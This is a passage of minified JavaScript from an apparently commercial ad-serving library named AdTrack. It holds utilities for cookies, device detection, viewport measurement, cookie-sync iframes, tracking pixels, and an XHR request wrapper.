    if (o && o.length > 0) for (var d = 0; d < o.length; d++) if (a.isBidOfPlacement(o[d], e, i, r, n)) {
      s = !0;
      break;
    }
    return s;
  }, a.isInPrebidAdUnits = function (t, e, i, r, n) {
    var s = !1;
    if (t && t.length > 0) for (var o = 0; o < t.length; o++) if (a.isInPrebidAdUnit(t[o], e, i, r, n)) {
      s = !0;
      break;
    }
    return s;
  }, a.isSecure = function (t) {
    return -1 !== t.indexOf("https://");
  }, a.deepAccess = function (t, e) {
    if (t) {
      e = String(e).split(".");
      for (var i = 0; i < e.length; i++) if (void 0 === (t = t[e[i]])) return;
      return t;
    }
  }, a.deepSetValue = function (t, e, i) {
    if (t) {
      e.split && (e = e.split("."));
      for (var r, n = 0, s = e.length, a = t; n < s; ++n) r = a[e[n]], a = a[e[n]] = n === s - 1 ? i : null != r ? r : !~e[n + 1].indexOf(".") && +e[n + 1] > -1 ? [] : {};
    }
  }, a.objectValues = function (t) {
    var e = [];
    if (t) for (var i in t) t.hasOwnProperty(i) && e.push(t[i]);
    return e;
  }, a.getLanguage = function (t, e) {
    if ("undefined" != typeof navigator) {
      var i = navigator.language || navigator.languages && navigator.languages[0] || navigator.userLanguage || "";
      return t && "string" == typeof i ? -1 !== i.indexOf("-") ? i.split("-")[0] : e && i ? i : "" : i || "";
    }
    return "";
  }, a.getAppName = function () {
    if ("string" == typeof navigator.userAgent) {
      var t = /^([a-z]+)\//i.exec(navigator.userAgent);
      if (t && t[1]) return t[1];
    }
    return "";
  }, a.isLocalStorageEnabled = function () {
    return a.setLocalStorageItem("r2b2_ls_test", "1"), "1" === a.getLocalStorageItem("r2b2_ls_test") && (a.removeLocalStorageItem("r2b2_ls_test"), !0);
  }, a.setLocalStorageItem = function (t, e) {
    try {
      return localStorage.setItem(t, e);
    } catch (t) {
      return null;
    }
  }, a.getLocalStorageItem = function (t) {
    try {
      return localStorage.getItem(t);
    } catch (t) {
      return null;
    }
  }, a.removeLocalStorageItem = function (t) {
    try {
      return localStorage.removeItem(t);
    } catch (t) {
      return null;
    }
  }, a.simpleStringGenerator = function (t, e) {
    for (var i = "", r = 0; r < t; r++) i += Math.random().toString(36).substring(3, 4);
    return e ? e + i : i;
  }, a.readCookie = function (t) {
    t += "=";
    for (var e = document.cookie.split(";"), i = 0; i < e.length; i++) {
      for (var r = e[i]; " " == r.charAt(0);) r = r.substring(1);
      if (0 == r.indexOf(t)) return r.substring(t.length, r.length);
    }
    return "";
  }, a.setCookieFirstParty = function (t, e, i) {
    var r = new Date();
    r.setTime(r.getTime() + 1e3 * i);
    var n = "expires=" + r.toUTCString();
    document.cookie = t + "=" + e + "; " + n + ";domain=" + a.getDomainName(document.location.host) + "; Path=/";
  }, a.getDPI = function () {
    if (void 0 === r) try {
      var t = document.createElement("div");
      t.setAttribute("style", "height: 1in; position: absolute; width: 1in; top:-100px; left:-100px;");
      var e = document.getElementsByTagName("body")[0];
      e.appendChild(t), r = t.offsetHeight, e.removeChild(t);
    } catch (t) {}
    return r > 0 ? r : 96;
  }, a.screenDiagonal = function (t, e) {
    return Math.sqrt(Math.pow(t, 2) + Math.pow(e, 2)) / a.getDPI();
  }, a.isMobile = function (t, e) {
    if (e = e || 11, void 0 === n) {
      var i = navigator.userAgent || navigator.vendor || window.opera,
        r = a.screenDiagonal(screen.width, screen.height);
      if (d = !1, (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|iPad|playbook|silk/i.test(o = i) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(o.substr(0, 4))) && (d = !0), n = d, s = r <= e, !i) return s;
    }
    var o, d;
    return t ? n && s : n;
  }, a.getViewportRealWidth = function (t, e) {
    return t.innerWidth && !e ? t.innerWidth : t.document.documentElement.clientWidth || t.document.body.clientWidth;
  }, a.getViewportRealHeight = function (t, e) {
    return t.innerHeight && !e ? t.innerHeight : t.document.documentElement.clientHeight || t.document.body.clientHeight;
  }, a.getScreenSize = function () {
    var t, e;
    return !AdTrack.BrowserFlags.isPhone || 270 != window.orientation && 90 != window.orientation && -90 != window.orientation ? (t = screen.width, e = screen.height) : (t = screen.height, e = screen.width), {
      w: t,
      h: e
    };
  }, a.getOrientation = function () {
    var t = a.getScreenSize();
    return t.w > t.h ? "landscape" : "portrait";
  }, a.windowTopAccess = function () {
    var t = null;
    try {
      window.top.document && (t = window.top);
    } catch (t) {}
    return t;
  }, a.getCrossFrameRect = function (t) {
    try {
      var e = a.windowTopAccess(),
        i = t.ownerDocument,
        r = i.defaultView || i.parentWindow,
        n = t.getBoundingClientRect();
      if (!e || e && r === e) return n;
      for (var s, o = {
          left: n.left,
          right: n.right,
          top: n.top,
          bottom: n.bottom,
          x: n.x,
          y: n.y,
          width: n.width,
          height: n.height
        }; r !== e;) s = r.frameElement.getBoundingClientRect(), o.left += s.left, o.right += s.left, o.top += s.top, o.bottom += s.top, o.x += s.left, o.y += s.top, r = r.parent;
      return o;
    } catch (t) {}
  }, a.getEventRelativePos = function (t, e) {
    var i = 0,
      r = 0;
    if (t && t.clientX && e && "function" == typeof e.getBoundingClientRect) {
      var n = e.getBoundingClientRect(),
        s = t.clientX,
        a = t.clientY;
      if (s >= n.left && s <= n.right && a >= n.top && a <= n.bottom) {
        var o = n.right - n.left,
          d = n.bottom - n.top;
        o && d && (i = (s - n.left) / o, r = (a - n.top) / d);
      }
    }
    return {
      x: Math.round(1e3 * i),
      y: Math.round(1e3 * r)
    };
  }, a.redirect = function (t) {
    var e = a.windowTopAccess();
    if (e) {
      try {
        e.history.pushState && (AdTrack.BrowserFlags.isFirefox || AdTrack.BrowserFlags.isOldOpera) ? (e.history.pushState({}, e.document.title, e.location.href), e.location.assign(t)) : e.location.assign(t);
      } catch (i) {
        e.location.href = t;
      }
      return !0;
    }
    return !1;
  }, a.randomString = function (t) {
    return t || (t = ""), t + "" + Math.round(1e9 * Math.random());
  }, a.getDNT = function () {
    return "yes" === navigator.doNotTrack || "1" === navigator.doNotTrack || "1" === navigator.msDoNotTrack ? 1 : 0;
  }, a.getDevice = function () {
    var t = navigator.userAgent;
    return /(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(t) ? 5 : /Mobile|iP(hone|od|ad)|Android|BlackBerry|IEMobile|Kindle|NetFront|Silk-Accelerated|(hpw|web)OS|Fennec|Minimo|Opera M(obi|ini)|Blazer|Dolfin|Dolphin|Skyfire|Zune/.test(t) ? 4 : 2;
  }, a.getReferrer = function () {
    return (a.windowTopAccess() || window).document.referrer;
  }, a.getIframeStack = function () {
    var t = [],
      e = window;
    do {
      var i;
      try {
        i = e.location.href;
      } catch (t) {
        i = "";
      }
      t.unshift(i), e = e.parent;
    } while (e !== window.top);
    return t;
  }, a.getOrigin = function () {
    var t = (a.windowTopAccess() || window).location;
    return t.origin ? t.origin : t.protocol + "//" + t.hostname + (t.port ? ":" + t.port : "");
  }, a.getDomain = function (t) {
    return t && t.realDomain ? t.realDomain : a.getDomainNameFromUrl(AdTrack.url);
  }, a.getDomainName = function (t) {
    var e = t.split(".").reverse();
    return e.length >= 3 && e[1].match(/^(com|edu|gov|net|mil|org|nom|co|name|info|biz|us)$/i) ? e[2] + "." + e[1] + "." + e[0] : e[1] + "." + e[0];
  }, a.getDomainNameFromUrl = function (t, e) {
    if (e = e || !1, -1 !== (t = t.replace(/(https?:\/\/)?(www.)?/i, "")).indexOf("/") && (t = t.split("/")[0]), !e) {
      var i = 2;
      (t = t.split(".")).length > 1 && t[t.length - 2].match(/^(com|edu|gov|net|mil|org|nom|co|name|info|biz|us)$/i) && (i = 3), t = t.slice(t.length - i).join(".");
    }
    return t;
  }, a.csyncFrame = function (t) {
    var e = '<iframe frameborder="0" allowtransparency="true" marginheight="0" marginwidth="0" width="0" hspace="0" vspace="0" height="0" style="height:0px;width:0px;display:none;" scrolling="no" src="' + t + '"></iframe>',
      i = document.createElement("div");
    i.innerHTML = e;
    var r = i.firstChild;
    document.getElementsByTagName("body")[0].appendChild(r);
  }, a.createFrame = function (t, e, i) {
    var r = document.createElement("iframe");
    r.setAttribute("style", i), t.appendChild(r);
    try {
      var n = r.contentDocument || r.contentWindow.document;
      n.open(), n.write(e), n.close();
    } catch (t) {}
    return r;
  }, a.testAd = function (t, e) {
    var i = !1,
      r = {};
    try {
      e.forEach(function (e) {
        var n = t.match(e);
        if (null !== n) throw i = n, r;
      });
    } catch (t) {}
    return i;
  }, a.isBlackListedAds = function (t) {
    return a.testAd(t, ["sgreen.erne.co", "adcrowd-adcrowd1.netdna-ssl.com"]);
  }, a.firstUppercase = function (t) {
    return t.charAt(0).toUpperCase() + t.slice(1).toLowerCase();
  }, a.getLocation = function () {
    try {
      return top.document.location.href || "";
    } catch (t) {
      return document.location.href || "";
    }
  }, a.json2Url = function (t) {
    var e = "",
      i = "";
    for (var r in t) t.hasOwnProperty(r) && (e += i + r + "=" + encodeURIComponent(t[r]), i = "&");
    return e;
  }, a.percentage = function (t) {
    return !(!(t = parseInt(t, 10)) || isNaN(t) || t < 0 || t < 100 && !(100 * Math.random() < t));
  }, a.throughput = function (t) {
    return !(!isNaN(t) && t >= 0 && t <= 1) || a.percentage(100 * t);
  }, a.uuid = function () {
    for (var t = [], e = 0; e < 256; e++) t[e] = (e < 16 ? "0" : "") + e.toString(16);
    var i = 4294967295 * Math.random() | 0,
      r = 4294967295 * Math.random() | 0,
      n = 4294967295 * Math.random() | 0,
      s = 4294967295 * Math.random() | 0;
    return t[255 & i] + t[i >> 8 & 255] + t[i >> 16 & 255] + t[i >> 24 & 255] + "-" + t[255 & r] + t[r >> 8 & 255] + "-" + t[r >> 16 & 15 | 64] + t[r >> 24 & 255] + "-" + t[63 & n | 128] + t[n >> 8 & 255] + "-" + t[n >> 16 & 255] + t[n >> 24 & 255] + t[255 & s] + t[s >> 8 & 255] + t[s >> 16 & 255] + t[s >> 24 & 255];
  }, a.firePixel = function (t) {
    try {
      new Image().src = t;
    } catch (t) {}
  }, a.createTrackPixelHtml = function (t) {
    if (!t) return "";
    let e = '<div style="position:absolute;left:0px;top:0px;visibility:hidden;">';
    return e += '<img src="' + encodeURI(t) + '"></div>';
  }, a.useJsTracker = function (t, e) {
    if (t && e && e.id) {
      var i = t.match(/\/\/cdn\.adnxs\.com\/v|\/\/cdn\.adnxs\-simple\.com\/v/),
        r = t.match("trk.js"),
        n = i && i.length && r && r.length;
      if ("<script" === t.substr(0, 7) && n) {
        var s = t.indexOf('src="') + 5,
          a = t.indexOf('"', s),
          o = t.substring(s, a);
        o = o.replace("%native_dom_id%", e.id);
        var d = document.createElement("script");
        e.parentNode.insertBefore(d, e), d.src = o;
      }
    }
  }, a.useTrackerFromHtml = function (t) {
    if (t) {
      var e = t.match(/src='([a-zA-Z0-9\/\:\-\_\.\?\&\=\%\#]+)'|src="([a-zA-Z0-9\/\:\-\_\.\?\&\=\%\#]+)"/);
      if (!e || !e[1] && !e[2]) return !1;
      for (var i = e[1] || e[2], r = [/\/\/[a-z0-9\.\-]{0,20}adnxs[\-simple]{0,7}\.com/, /\/\/[a-z0-9\.\-]{0,20}pubmatic\.com/, /\/\/[a-z0-9\.\-]{0,20}onetag[\-sy]{0,4}\.com/, /\/\/[a-z0-9\.\-]{0,20}rubiconproject\.com/], n = 0; n < r.length; n++) if (i.match(r[n])) {
        "<iframe" === t.substr(0, 7) ? this.csyncFrame(i) : "<img" === t.substr(0, 4) && this.firePixel(i);
        break;
      }
    }
  }, a.reportCreative = function (t, e, i, r, n, s, a) {
    a = "string" == typeof a ? a : JSON.stringify(a);
    var o = "//" + t + "/creative.php",
      d = "id=" + e + "&c=" + i + "&cid=" + encodeURIComponent(r) + "&did=" + encodeURIComponent(n) + "&p=" + s + "&data=" + encodeURIComponent(a) + "&u=" + AdTrack.url;
    AdTrack.Ajax.request({
      url: o,
      method: "POST",
      data: d,
      async: !0,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      }
    }).send();
  }, a.setOnclick = function (t, e, i) {
    return Array.prototype.forEach.call(t, function (t) {
      a.addEvent(t, "click", e), t.onclick = i ? "return true;" : "return false;";
    }), t;
  }, a.debounce = function (t, e) {
    var i;
    return function () {
      var r = arguments,
        n = function () {
          clearTimeout(i), t.apply(void 0, Array.prototype.slice.call(r));
        };
      clearTimeout(i), i = setTimeout(n, e);
    };
  }, a.getUrlWithoutSafeFrame = function (t) {
    var e = AdTrack.url;
    try {
      if (!a.windowTopAccess() && t) {
        if (t.definition.info && t.definition.info.realDomain) return "https://" + t.definition.info.realDomain + "/";
        var i = t.unitID.d.split("."),
          r = t.settings.publisher.tag;
        if (r && i.length > 2 && (i[0] === r || "pomoMediaGroup" === r && ("pmg" === i[0] || "pomo" === i[0]))) return i.shift(), "https://" + i.join(".") + "/";
      }
    } catch (t) {}
    return e;
  }, a.isSafeFrameWindow = function (t) {
    return !(!t.$sf || !t.$sf.ext);
  }, a.isPremiumAdform = function (t) {
    return "string" == typeof t.tag && "string" == typeof t.flag && -1 !== t.tag.indexOf("adform") && -1 === t.tag.indexOf("-im") && (-1 !== t.flag.indexOf("premium") || 1 == t.unmaskedDomain);
  }, a.getVideoImpUrl = function (t, e, i, r) {
    return "//" + r + "/load.php?" + AdTrack.Utils.uri("d", t.d) + "&" + AdTrack.Utils.uri("g", t.g) + "&" + AdTrack.Utils.uri("p", t.p) + "&" + AdTrack.Utils.uri("m", t.m) + "&" + AdTrack.Utils.uri("c", i.tag) + "&" + AdTrack.Utils.uri("cf", i.flag ? i.flag : "") + "&" + AdTrack.Utils.uri("u", AdTrack.url) + "&" + AdTrack.Utils.uri("key", e) + "&l=1&t=0";
  }, a.clearClass = function (t, e) {
    return Array.prototype.forEach.call(t, function (t) {
      t.className = t.className.replace(e, "").trim(), "" == t.className && t.removeAttribute("class");
    }), null;
  }, a.getNS = function (t, e) {
    return t.querySelectorAll("." + e);
  }, a.setText = function (t, e) {
    return Array.prototype.forEach.call(t, function (t) {
      t.innerHTML = e;
    }), t;
  }, a.setAttribute = function (t, e, i) {
    return Array.prototype.forEach.call(t, function (t) {
      t.setAttribute(e, i);
    }), t;
  }, a.setZoomin = function (t, e) {
    return Array.prototype.forEach.call(t, function (t) {
      if ("scale" === e) {
        var i = "scale(0.98,0.98)";
        t.style.webkitTransform = i, t.style.MozTransform = i, t.style.msTransform = i, t.style.OTransform = i, t.style.transform = i;
      } else "opacity" === e && (t.style.opacity = .5);
      t.style.transition = "transform 5s, opacity 5s", t.style.transformOrigin = "0% 0%";
      var r = AdTrack.Viewability.Handler(),
        n = AdTrack.Viewability.Probe(window, function () {
          return AdTrack.Viewability.getVisiblePercentage(t);
        }, AdTrack.Viewability.getBasicCallback(r));
      setTimeout(function () {
        r.addCallback(function (i) {
          n.dispose(), "scale" === e ? (t.style.webkitTransform = "scale(1,1)", t.style.MozTransform = "scale(1,1)", t.style.msTransform = "scale(1,1)", t.style.OTransform = "scale(1,1)", t.style.transform = "scale(1,1)") : "opacity" === e && (t.style.opacity = 1);
        });
      }, 3e3);
    }), t;
  }, a.isTransformOnElement = function (t, e, i) {
    if (t && e) try {
      var r = t.getComputedStyle(e).getPropertyValue("transform");
      if (r && "none" !== r) return !0;
      if (i) return a.isTransformOnElement(t, e.parentElement, !0);
    } catch (t) {}
    return !1;
  }, a.getHTMLWithErrorHandling = function (t, e, i) {
    var r = document.createElement(t);
    for (var n in e) if (e.hasOwnProperty(n)) {
      var s = e[n];
      r.setAttribute(n, s);
    }
    if ("function" == typeof i) {
      var a = "adTrackCallback" + Math.round(1e6 * Math.random());
      window[a] = function () {
        window[a] = function () {}, i();
      }, r.setAttribute("onerror", 'window.parent["' + a + '"]()');
    }
    return r.outerHTML;
  }, a), AdTrack._AdFormUtils = function () {}, AdTrack._AdFormUtils.prototype = {
    generateAdxUrl: function (t, e, i, r) {
      var n = {
          test: !0,
          url: !0,
          tid: !0,
          rp: !0,
          pv: !0,
          adxjs: !0,
          lat: !0,
          lon: !0
        },
        s = [],
        a = [];
      if (!Array.isArray(t)) return console.error("Placement id list should be an array.");
      for (var o = 0; o < t.length; o++) a.push("mid=" + t[o]);
      for (var d in e) if (e.hasOwnProperty(d) && Array.isArray(e[d])) {
        var c = e[d];
        for (var h in c) c.hasOwnProperty(h) && (n[d] ? s.push(d + "=" + encodeURIComponent(h)) : a.push(d + "=" + e[d]));
      } else n[d] ? s.push(d + "=" + encodeURIComponent(e[d])) : a.push(d + "=" + e[d]);
      s.push(this.b2a(a.join("&")).replace(/=+$/, ""));
      var l = "adx/?rp=4&" + s.join("&") + (i ? "&callback=" + i : "");
      return r ? "//" + r + "/" + l : "//adx.adform.net/" + l;
    },
    b2a: function (t) {
      return AdTrack.Utils.b2a(t);
    }
  }, AdTrack.Timer = AdTrack.Timer || (o = function (t, e) {
    t = parseInt(t);
    var i = "function" == typeof e ? e : function () {},
      r = isNaN(t) ? 500 : t,
      n = 0,
      s = null;
    this.start = function () {
      s || (s = setInterval(function () {
        i(n += r / 1e3);
      }, r), 0 === n && i(0));
    }, this.stop = function () {
      s = clearInterval(s);
    }, this.timeElapsed = function () {
      return n;
    };
  }, {
    create: function (t, e) {
      return new o(t, e);
    }
  });
}, function (t, e) {
  var i, r;
  AdTrack.ID = AdTrack.ID || (i = function (t, e, i, r) {
    this.d = t, this.g = e, this.p = i, this.m = r ? 1 : 0, this.type = r ? "mobile" : "classic", this.getName = function () {
      return this.type + "_" + this.d + "_" + this.g + "_" + this.p;
    }, this.getNameForReporting = function () {
      return this.d + "/" + this.g + "/" + this.p + "/" + this.type;
    }, this.getWrapName = function () {
      var t = "AdTrack";
      return t += AdTrack.Utils.firstUppercase(this.g), t += AdTrack.Utils.firstUppercase(this.p), t += AdTrack.Utils.firstUppercase(this.type);
    }, this.getPath = function () {
      return this.d + "/" + this.g + "/" + this.p + ("mobile" === this.type ? "/" + this.type : "");
    }, this.equalTo = function (t) {
      return "" + t == "" + this;
    }, this.isDomain = function (t) {
      return this.d === t;
    }, this.contains = function (t) {
      return -1 !== this.getName().indexOf(t);
    }, this.isPosition = function (t) {
      return this.p === t;
    }, this.toString = function () {
      return this.getName();
    };
  }, r = {
    createIdDGPM: function (t, e, r, n) {
      return n = n ? 1 : 0, e = "string" == typeof e ? e : "", r = "string" == typeof r ? r : "", (t = "string" == typeof t ? t : "") && e && r ? new i(t, e, r, n) : null;
    },
    createIdDGPT: function (t, e, i, n) {
      var s = "mobile" === n ? 1 : 0;
      return r.createIdDGPM(t, e, i, s);
    },
    createIdFromBid: function (t) {
      var e = {};
      return t.params && !t.params.length && (e = t.params), t.params && 1 === t.params.length && (e = t.params[0]), t.ext && t.ext.dgpm && (e = t.ext.dgpm), r.createIdDGPM(e.d, e.g, e.p, e.m);
    }
  });
}, function (t, e) {
  var i, r, n, s, a;
  AdTrack.Log = AdTrack.Log || (i = "true" === AdTrack.Utils.getParameterByName("adtrack-debug") || AdTrack.Utils.getLocalStorageItem("adtrack-debug"), r = {
    0: "17a2b8",
    1: "ffc107",
    2: "dc3545"
  }, n = [], s = function (t, e, i, r, n) {
    this.placement = t, this.module = e, this.msg = i, this.severity = r, this.time = n;
  }, (a = {
    INFO: 0,
    WARNING: 1,
    ERROR: 2
  }).debugPlacement = function (t, e, a, o, d) {
    if (d = d || !0, i) {
      "number" == typeof o && r[o] || (o = 0);
      var c = new s(t, e, a, o, AdTrack.Utils.timeRelative());
      d ? function (t) {
        var e = document.getElementById("AdTrackDebugConsole"),
          i = r[t.severity] || r[0];
        "object" == typeof t.msg ? null != e && (e.value += "\n" + t.msg) : null != e ? e.value += "\n" + (t.placement ? t.placement + "/" : "") + t.module + " " + t.msg : console.log("%cAdTrack%c " + t.time + " %c" + (t.placement ? t.placement + "/" : "") + t.module + " " + t.msg, "color: #ffffff; background: #" + i + "; font-weight: bold; padding: 2px 3px; border-radius: 3px;", "font-weight: bold;", "");
      }(c) : n.unshift(c);
    }
  }, a.debug = function (t, e, i, r) {
    a.debugPlacement(null, t, e, i, r);
  }, a);
}, function (t, e) {
  var i;
  AdTrack.Events = AdTrack.Events || (i = function (t) {
    var e = {},
      i = !1,
      r = function (t) {
        return "string" == typeof t && (e[t] = {
          callbacks: [],
          triggered: !1,
          triggerOnce: !1
        }, !0);
      };
    !function (t) {
      t && t.length > 0 && "function" == typeof t.forEach && t.forEach(function (t) {
        r(t) && (i = !0);
      });
    }(t);
    var n = {
      registerEvent: function (t) {
        return !!e[t] || !i && r(t);
      },
      markEventAsTriggerOnce: function (t) {
        e[t] && (e[t].triggerOnce = !0);
      },
      addCallback: function (t, i) {
        n.registerEvent(t) && "function" == typeof i && (e[t].triggerOnce && e[t].triggered ? i() : e[t].callbacks.push(i));
      },
      trigger: function (t, i) {
        if (e[t]) {
          if (e[t].triggerOnce && e[t].triggered) return;
          if (e[t].triggered = !0, e[t].triggerOnce) for (; e[t].callbacks.length > 0;) try {
            var r = e[t].callbacks.shift();
            i && i.length > 0 ? r.apply(this, i) : r();
          } catch (t) {} else e[t].callbacks.forEach(function (t) {
            try {
              i && i.length > 0 ? t.apply(this, i) : t();
            } catch (t) {}
          });
        }
      }
    };
    return n;
  }, {
    create: function (t) {
      return new i(t);
    }
  });
}, function (t, e) {
  AdTrack.Ajax = AdTrack.Ajax || {
    request: function (t, e) {
      "string" == typeof t && (t = {
        url: t
      }), t.url = t.url || "", t.method = t.method || "get", t.data = t.data || {}, t.async = void 0 === t.async || t.async, !t.label || t.label;
      var i = [];
      return {
        host: {},
        doError: function (r) {
          this.host.error || (this.host.error = !0, this.ops.report && e && e.doError(t.label + " Ajax error: " + r)), this.failCallback ? (r = this.xhrType + " " + r, this.runFailCallback(r, !1)) : i.push(r);
        },
        runFailCallback: function (i, r) {
          try {
            this.failCallback && this.failCallback.apply(this.host, [i, r, this.xhr]);
          } catch (i) {
            e && e.doError(t.label + " fail callback failed: " + i.message);
          }
        },
        runDoneCallback: function (i) {
          try {
            this.doneCallback && this.doneCallback.apply(this.host, [i, this.xhr]);
          } catch (i) {
            e && e.doError(t.label + " callback failed: " + i.message);
          }
        },
        runAlwaysCallback: function () {
          try {
            this.alwaysCallback && this.alwaysCallback.apply(this.host, [this.xhr]);
          } catch (t) {}
        },
        process: function (t) {
          try {
            var i = this;
            if (this.ops = t, this.xhr = null, this.xhrType = "", this.ops.failCallback && this.fail(this.ops.failCallback), window.XMLHttpRequest) try {
              this.xhr = new XMLHttpRequest(), this.xhrType = "XHR";
            } catch (t) {
              this.doError("Error creating XHR - " + t.message);
            } else try {
              this.xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0"), this.xhrType = "AXO6.0";
            } catch (t) {
              try {
                this.xhr = new ActiveXObject("MSXML2.XMLHTTP.3.0"), this.xhrType = "AXO3.0";
              } catch (t) {
                try {
                  this.xhr = new ActiveXObject("Microsoft.XMLHTTP"), this.xhrType = "AXO";
                } catch (t) {
                  this.doError("Unable to create XHR object");
                }
              }
            }
            if (this.xhr) {
              try {
                this.xhr.ontimeout = t.ontimeout, this.xhr.onerror = t.onerror, this.xhr.onreadystatechange = function (r) {
                  i.runAlwaysCallback();
                  try {
                    if (4 === i.xhr.readyState && i.xhr.status >= 200 && i.xhr.status < 300) {
                      var n = i.xhr.responseText;
                      if (n && !0 === t.json && "undefined" != typeof JSON) try {
                        n = JSON.parse(n);
                      } catch (t) {
                        if (i.ops.report && e) {
                          var s = AdTrack.Utils.time() - AdTrack.startTime;
                          e.doError("Invalid response after " + s + " ms: " + n, null, "debug");
                        }
                        i.doError("JSON.parse failed - " + t.message);
                      }
                      i.runDoneCallback(n);
                    } else if (4 === i.xhr.readyState) {
                      var a = 0;
                      if (i.xhr.timeout && (a = i.timeStart + i.xhr.timeout - 5, i.host.timeouted = r.timeStamp > a), a > 1e5) i.doError("Request failed, cant detect TO (" + i.xhr.status + "): " + i.xhr.statusText);else if (i.host.timeouted) i.runFailCallback("Request timeouted", !0);else {
                        var o = "Request failed (" + i.xhr.status + "): " + i.xhr.statusText;
                        i.xhr.responseText && (o += "; Reason: (" + i.xhr.responseText + ")"), i.doError(o);
                      }
                    }
                  } catch (t) {
                    i.doError("onreadystatechange failure (" + i.xhr.readyState + ") - " + t.message);
                  }
                };
              } catch (t) {
                this.doError("Cant set onreadystatechange - " + t.message);
              }
              try {
                "get" === t.method || "GET" === t.method ? this.xhr.open("GET", t.url + function (t, e) {
                  var i,
                    r = [];
                  for (var n in t) t.hasOwnProperty(n) && r.push(n + "=" + encodeURIComponent(t[n]));
                  return "" !== (i = r.join("&")) ? e ? e.indexOf("?") < 0 ? "?" + i : "&" + i : i : "";
                }(t.data, t.url), t.async) : this.xhr.open(t.method, t.url, t.async);
              } catch (t) {
                this.doError("Cant open xhr - " + t.message);
              }
              try {
                this.xhr.withCredentials = void 0 === t.withCredentials || !!t.withCredentials;
              } catch (t) {
                this.doError("Cant set withCredentials - " + t.message);
              }
              try {
                this.ops.async && 0 !== t.timeout && (this.xhr.timeout = t.timeout || 500);
              } catch (t) {
                this.doError("Cant set timeout - " + t.message);
              }
              try {
                t.headers && "object" == typeof t.headers && this.setHeaders(t.headers);
              } catch (t) {
                this.doError("Cant set headers - " + t.message);
              }
            } else this.doError("No XHR instance");
          } catch (t) {
            this.doError("processing failure - " + t.message);
          }
          return this;
        },
        done: function (t) {
          return this.doneCallback = t, this;
        },
        fail: function (t) {
          return this.failCallback = AdTrack.Utils.singleUseCallback(t), this;
        },
        always: function (t) {
          return this.alwaysCallback = t, this;
        },
        send: function () {
          if (this.host.error && i.length > 0 && this.failCallback) this.doError("(unreported) " + i[0]);else try {
            this.timeStart = AdTrack.Utils.timeRelative(), "get" === this.ops.method ? this.xhr.send() : this.xhr.send(this.ops.data);
          } catch (t) {
            this.doError("send failure - " + t.message);
          }
        },
        setHeaders: function (t) {
          for (var e in t) t.hasOwnProperty(e) && this.xhr && this.xhr.setRequestHeader(e, t[e]);
        }
      }.process(t);
    }
  };
}, function (t, e) {
  AdTrack.Definition = function (t) {
    this.definition = t, this.get = function (t) {
      return AdTrack.Utils.deepAccess(this.definition, t);
    }, this.getId = function () {
      return this.definition.placementId;
    }, this.getRenderer = function () {
      return this.definition.renderer;
    }, this.shouldUseRenderProxy = function () {
      return !!this.getOption("nthb") || !!this.getOption("multiImp");
    }, this.getOption = function (t, e) {
      if (e && e.options && e.options[t]) return e.options[t];
      if (this.definition.options) {
        if (this.definition.options[t]) return this.definition.options[t];
        var i = "custom" + (t.charAt(0).toUpperCase() + t.slice(1));
        if (this.definition.options[i]) return this.definition.options[i];
      }
    }, this.getDefaultCTA = function () {
      var t = "Navštívit stránku";
      return this.definition.info && this.definition.info.ctaDefault && (t = this.definition.info.ctaDefault), t;
    }, this.getChannelFromMap = function (t) {
      if (this.definition.channelMap) return this.definition.channelMap[t];
